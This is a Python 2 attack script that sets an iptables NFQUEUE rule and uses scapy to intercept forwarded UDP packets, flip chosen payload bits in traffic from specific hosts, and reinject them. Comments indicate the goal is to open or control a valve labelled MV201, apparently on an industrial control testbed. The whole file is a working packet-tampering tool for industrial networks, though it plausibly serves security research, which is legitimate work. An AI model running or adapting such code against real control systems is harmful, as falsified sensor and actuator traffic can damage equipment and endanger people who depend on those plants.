#!/usr/bin/env python 
# -*- coding:utf-8 -*-
#!/usr/bin/env python
# -*- coding:utf-8 -*-
# !/usr/bin/env python
# -*- coding:utf-8 -*-
from scapy.all import *
import random
import time
import numpy as np
from bitdump import *
import binascii
from modify_bit import *
from netfilterqueue import NetfilterQueue


index_alter = 0
#stage2_index
index2_50 = [74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 217, 218, 219, 220, 221, 222, 223, 224, 225, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 244, 245, 246, 247, 248, 249, 286, 287, 288, 289, 301, 302, 303, 304, 305, 317, 318, 319, 320, 321, 334, 335, 336, 337, 351, 352, 353, 367, 368, 369, 385]
index2_40 = [74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 96, 97]
index2_28 = [74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 96, 97, 142, 143, 144, 145, 194, 200, 214, 215]
index0_40 = [74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 96, 97, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 205, 207, 215, 216, 217]

p2_50 = np.zeros(len(index2_50), dtype=int)
p2_40 = np.zeros(len(index2_40), dtype=int)
p2_28 = np.zeros(len(index2_28), dtype=int)
p0_40 = np.zeros(len(index0_40), dtype=int)
vector = np.hstack((p2_50, p2_40, p2_28, p0_40))
vector = vector.tolist()
modify_time = 0
modify_flag = 0
modify_index = 0
success_times = 0
failed_times = 0
count = 0
start_time = 0
time_interval = 30


def handle_packet(packet):
    global index_alter
    global modify_flag
    global modify_time
    global count
    global vector
    global start_time
    global model
    #192:mv_201_open
    index_alter = 192
    pkt = IP(packet.get_payload())
    if pkt.haslayer('Raw'):
        if index_alter in range(len(p2_50)):
            if pkt['IP'].src == '192.168.0.22' and len(pkt['Raw']) == 50:
                rawpkt = binascii.unhexlify(modify_bit(pkt, index2_50[index_alter]))
                pktnew = IP(rawpkt)
                del pktnew['IP'].chksum
                del pktnew['UDP'].chksum
                packet.set_payload(str(pktnew))
        elif index_alter in range(len(p2_50), len(p2_50)+len(p2_40)):
            if pkt['IP'].src == '192.168.0.22' and len(pkt['Raw']) == 40:
                rawpkt = binascii.unhexlify(modify_bit(pkt, index2_40[index_alter - len(p2_50)]))
                pktnew = IP(rawpkt)
                del pktnew['IP'].chksum
                del pktnew['UDP'].chksum
                packet.set_payload(str(pktnew))
        elif index_alter in range(len(p2_50)+len(p2_40), len(p2_50)+len(p2_40)+len(p2_28)):
            if pkt['IP'].src == '192.168.0.22' and len(pkt['Raw']) == 28:
                rawpkt = binascii.unhexlify(modify_bit(pkt, index2_28[index_alter - (len(p2_50)+len(p2_40))]))
                pktnew = IP(rawpkt)
                del pktnew['IP'].chksum
                del pktnew['UDP'].chksum
                packet.set_payload(str(pktnew))
        elif index_alter in range(len(p2_50)+len(p2_40)+len(p2_28), len(p2_50)+len(p2_40)+len(p2_28)+len(p0_40)):
            if pkt['IP'].src == '192.168.0.20' and len(pkt['Raw']) == 40:
                #control mv201 states
                rawpkt = binascii.unhexlify(on(pkt, index0_40[index_alter - (len(p2_50)+len(p2_40)+len(p2_28))]))
                pktnew = IP(rawpkt)
                del pktnew['IP'].chksum
                del pktnew['UDP'].chksum
                packet.set_payload(str(pktnew))
    packet.accept()


if __name__ == '__main__':
    os.system('iptables -t mangle -A FORWARD -j NFQUEUE --queue-num 1')
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, handle_packet,10)
    try:
        print "[*] starting NFQUEUE"
        start_time = time.time()
        print "start_time", start_time
        nfqueue.run()
    except KeyboardInterrupt:
        os.system('sudo iptables -t mangle -F')
        print "[*] stopping NFQUEUE"
        nfqueue.unbind()
